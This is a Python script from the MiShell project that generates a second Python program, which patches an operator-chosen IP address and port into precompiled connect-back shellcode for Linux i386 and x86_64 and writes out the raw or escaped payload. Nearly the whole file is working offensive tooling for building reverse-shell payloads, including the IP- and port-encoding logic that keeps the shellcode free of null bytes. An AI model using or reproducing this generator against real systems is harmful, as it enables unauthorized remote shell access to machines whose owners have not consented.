#!/usr/bin/python3
"""
Copyright (c) 2022 TheOddZer0

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
of the Software, and to permit persons to whom the Software is furnished to do
so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Generate a generator.py from currently built payload
"""
import os
import sys
import argparse

# Configs
# Used to change some usual settings

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
VERSION = "1.0.0"
# architecture: endianness (1 for little, 2 for big)
ARCHITECTURES = {"i386": 1, "x86_64": 1}
parser = argparse.ArgumentParser()

PAYLOAD_CLASS_TEMPLATE = "class Payload_{os}_{arch}({base}, arch='{arch}', shellcode='{shellcode_encoded}'):\n    pass\n"


def _hex(num: int):
    result = hex(num)[2:]
    if len(result) % 2 != 0:
        result = "0" + result
    return result


TEMPLATE = r'''#!/usr/bin/python3
"""
Copyright (c) 2022 TheOddZer0

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
of the Software, and to permit persons to whom the Software is furnished to do
so, subject to the following conditions:
The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

Generate a payload without any need to compile anything.
See the original repo for more info: https://github.com/TheOddZer0/MiShell
"""
import sys
import argparse
from typing import Tuple

VERSION = "{version}"


def _hex(num: int):
    result = hex(num)[2:]
    if len(result) % 2 != 0:
        result = "0" + result
    return result

def _reverse_list(value: list):
    value.reverse()
    return value


class PayloadType:
    def __init__(self, ip: str, port: int):
        self.ip = ip
        self.port = port

    def __init_subclass__(cls, arch: str, shellcode: str):
        cls.arch = arch
        cls.shellcode = shellcode

    def generate(self, ip=None, port=None) -> str:
        raise NotImplementedError

    def encode_ip(self, ip: str = None) -> Tuple[str, str]:
        raise NotImplementedError

    def encoded_port(self, port: int) -> str:
        raise NotImplementedError


class LEPayloadBase(PayloadType, arch=None, shellcode=None):
    def generate(self, ip=None, port=None) -> str:
        ip_result, offset = self.encode_ip(ip)
        shellcode = self.shellcode.replace("\\x80\\x01\\x01\\x02", ip_result)
        shellcode = shellcode.replace("\\x01\\x01\\x01\\x01", offset)
        shellcode = shellcode.replace("\\x11\\x5c", self.encode_port(port))
        return shellcode

    def encode_ip(self, ip: str = None) -> Tuple[str, str]:
        if ip == None:
            ip = self.ip
        result = ""
        offset = ""
        parts = ip.split(".")
        if len(parts) != 4:
            print("That is actually not a valid IP address", file=sys.stderr)
            sys.exit(1)
        for part in parts:
            try:
                part = int(part)
            except:
                print("Invalid IP '", ip, "'", file=sys.stderr)
                sys.exit(1)
            if part > 255 or part < 0:
                print("Invalid IP '", ip, "'", file=sys.stderr)
                sys.exit(1)
            if part == 255:
                print("This method will not work on your IP", file=sys.stderr)
                sys.exit(1)
            _hexed = _hex(part + 1)
            if not ("00" == _hexed or (_hexed.endswith("0") and parts.index(str(part)) != len(parts) - 1)):
                result += "\\x" + _hexed
                offset += "\\x" + "01"
            else:
                result += "\\x" + _hex(part + 2)
                offset += "\\x" + "02"
        return result, offset

    def encode_port(self, port: int = None) -> str:
        if port == None:
            port = self.port
        result = _hex(port)
        return "\\x" + result[:2] + "\\x" + result[2:]

class BEPayloadBase(PayloadType, arch=None, shellcode=None):
    def generate(self, ip=None, port=None) -> str:
        ip_result, offset = self.encode_ip(ip)
        shellcode = self.shellcode.replace("\\x02\\x01\\x01\\x80", ip_result)
        shellcode = shellcode.replace("\\x01\\x01\\x01\\x01", offset)
        shellcode = shellcode.replace("\\x5c\\x11", self.encode_port(port))
        return shellcode

    def encode_ip(self, ip: str = None) -> Tuple[str, str]:
        if ip == None:
            ip = self.ip
        result = ""
        offset = ""
        parts = _reverse_list(ip.split("."))
        if len(parts) != 4:
            print("That is actually not a valid IP address", file=sys.stderr)
            sys.exit(1)
        for part in parts:
            try:
                part = int(part)
            except:
                print("Invalid IP '", ip, "'", file=sys.stderr)
                sys.exit(1)
            if part > 255 or part < 0:
                print("Invalid IP '", ip, "'", file=sys.stderr)
                sys.exit(1)
            if part == 255:
                print("This method will not work on your IP", file=sys.stderr)
                sys.exit(1)
            _hexed = _hex(part + 1)
            if not ("00" == _hexed or (_hexed.endswith("0") and parts.index(str(part)) != len(parts) - 1)):
                result += "\\x" + _hexed
                offset += "\\x" + "01"
            else:
                result += "\\x" + _hex(part + 2)
                offset += "\\x" + "02"
        return result, offset

    def encode_port(self, port: int = None) -> str:
        if port == None:
            port = self.port
        result = _hex(port)
        return "\\x" + result[2:] + "\\x" + result[:2]

PAYLOADS

parser = argparse.ArgumentParser()
supported = dict()
# XXX: Introducing a new variable (name), Results into changing the size
# of result of vars, and raising an exception
# this workaround avoids it, but it doesn't fix it.
# Find a better way?
name = None
for name in vars().keys():
    if name.startswith("Payload_") and issubclass(vars()[name], PayloadType):
        supported[name[8:]] = vars()[name]
parser.add_argument(
    "--ip", help="The IP to connect back to (IPv4 is only supported)", required=True)
parser.add_argument("--port", help="The port number to connect back to",
                    required=True, metavar="0-65535", type=int)
parser.add_argument("--system", help="The value should be in format `<OS>_<ARCH>`, defines the system to generate payload for (Defaults to linux_i386)",
                    choices=supported.keys(), default="linux_i386")
parser.add_argument("--escape", help="Produce an escaped payload instead of raw (\\x00 instead of NULL)",
                    action="store_true")
parser.add_argument("--output", "-o", help="Write the output to FILE instead of stdout",
                    metavar="FILE", default=None)
parser.add_argument("--raw", help="Opposite of --escape, The default",
                    action="store_false", dest="escape", default=False)
ns = parser.parse_args()
if ns.port not in range(65536):
    print("Invalid port", file=sys.stderr)
    sys.exit(1)
gen = supported[ns.arch](ns.ip, ns.port)
ip, offset, port = *gen.encode_ip(), gen.encode_port()
print("Generating payload (IP=", ip,
      " offset=", offset,
      " port=", port, ")", file=sys.stderr, sep="")
payload = gen.generate()
if ns.output is None:
    if ns.escape:
        print(payload)
    else:
        for i in range(2, len(payload), 4):
            print(chr(int(payload[i:i+2], base=16)), end="")
else:
    if ns.escape:
        with open(ns.output, "w") as f:
            f.write(payload)
    else:
        with open(ns.output, "w") as f:
            if ns.escape:
                f.write(payload)
            else:
                f.write("".join([chr(int(payload[i:i+2], base=16))
                        for i in range(2, len(payload), 4)]))


'''.format(version=VERSION)


def generate_payload_class(arch: str, os_: str, endianness: int, shellcode: bytes):
    base = "LEPayloadBase"
    shellcode_encoded = r"\\x".join(["", *[_hex(i) for i in shellcode]])
    if endianness == 2:
        base = "BEPayloadBase"
    if arch not in ("i386", "x86_64"):
        print("Architecture is not known, if you are using an older version of payload2generator\n"
              "for a newer version of MiShell, please use the updated version as the\n"
              "result might be incorrect, if not. this is a bug and please report this on github to TheOddZer0",
              file=sys.stderr)
    return PAYLOAD_CLASS_TEMPLATE.format(
        os=os_, arch=arch, base=base, shellcode_encoded=shellcode_encoded)


def detect_endianness(arch: str, shellcode: bytes) -> int:
    # First try to detect it from arch
    # Then try to find the common patterns (the default IP and port)
    # if they are in reverse then it's little, if not it's big
    if arch in ARCHITECTURES:
        result = ARCHITECTURES[arch]
        print("{0} (pre-detected)".format("little" if result == 1 else "big"),
              file=sys.stderr)
        return ARCHITECTURES[arch]
    print("Trying to detect endianness by the payload itself...",
          end="", file=sys.stderr)
    # The default IP, offset and port respectively
    if b"\x80\x01\x01\x02" in shellcode and\
       b"\x01\x01\x01\x01" in shellcode and\
       b"\x11\x5c" in shellcode:
        print("little", file=sys.stderr)
        return 1
    if b"\x02\x01\x01\x80" in shellcode and\
       b"\x01\x01\x01\x01" in shellcode and\
       b"\x5c\x11" in shellcode:
        print("big", file=sys.stderr)
        return 2
    else:
        print("failed", file=sys.stderr)
        sys.exit(1)

# Well, A programmer is a app generator, so,
# I'm a generator of a generator which generates a generator which
# that generator generates a payload...


def main(argv=None):
    payloads = []
    parser.add_argument(
        "-C", help="Enter DIR before doing anything", metavar="DIR", dest="dir")
    parser.add_argument("-i", "--ignore-arch", help="Ignore an architecture or a list of architectures in the resulted generator",
                        nargs="*", metavar="IGNORED", default=set())
    parser.add_argument("--version", help="Show MiShell version",
                        action="version", version=VERSION)
    ns = parser.parse_args(argv)
    ignored = set(ns.ignore_arch)
    if "i386" in ignored:
        print("i386 cannot be ignored, ignoring the request", file=sys.stderr)
        ignored.remove("i386")
    if ns.dir is not None:
        print("Entering '{0}'".format(ns.dir), file=sys.stderr)
        os.chdir(ns.dir)
    for name in os.listdir("."):
        if os.path.isfile(name) and name.startswith("payload_")\
                and name.endswith(".bin"):
            payload = name
            os_, arch = payload[8:-4].split("_", 1)
            print("Discovered payload with architecture '{0}' ({1})".format(
                arch, os_), file=sys.stderr)
            if arch in ignored:
                print("{0}: ignored".format(arch), file=sys.stderr)
            else:
                with open(payload, "rb") as f:
                    code = f.read()
                payloads.append(
                    (arch, os_, detect_endianness(arch, code), code))
                print("{0}: added".format(arch), file=sys.stderr)
    print("Added {0} payloads".format(len(payloads)), file=sys.stderr)
    generator = TEMPLATE
    classes = ""
    for args in payloads:
        classes += generate_payload_class(*args)
    print(generator.replace("PAYLOADS", classes))


if __name__ == "__main__":
    main()
